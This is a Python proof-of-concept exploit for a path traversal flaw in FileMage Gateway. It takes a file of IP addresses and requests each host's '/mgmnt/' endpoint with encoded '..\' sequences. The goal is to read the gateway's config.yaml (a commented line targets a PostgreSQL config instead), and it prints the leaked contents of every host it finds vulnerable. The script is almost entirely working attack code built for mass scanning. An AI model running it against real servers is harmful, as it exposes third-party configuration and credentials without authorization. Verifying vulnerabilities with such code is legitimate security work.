## Path Traversal in FileMage Gateway
## 07/12/2023
## Author: Bryce Harty
import requests
import warnings
warnings.filterwarnings("ignore")
def worker(url):
    response = requests.get(url, verify=False, timeout=.5)
    return response
def main():
    listIP = []
    file_path = input("Enter the path to the file containing the IP addresses: ")
    with open(file_path, 'r') as file:
        ip_list = file.read().splitlines()
        searchString = "tls"
        for ip in ip_list:
            url = f"https://{ip}" + "/mgmnt/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cprogramdata%5cfilemage%5cgateway%5cconfig.yaml"
            #url = f"https://{ip}" + "/mgmnt/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cprogram%20file%5cpostgresql%5c12%5cdata%5cpostgres.conf"
            try:
                response = worker(url)
                #print(response.text)
                if searchString in response.text:
                    print("Vulnerable IP: " + ip)
                    print(response.text)
                    listIP.append(ip)
            except requests.exceptions.RequestException as e:  
                print(f"Error occurred for {ip}: {str(e)}")

    for x in listIP:
        print(x)
if __name__ == '__main__':
    main()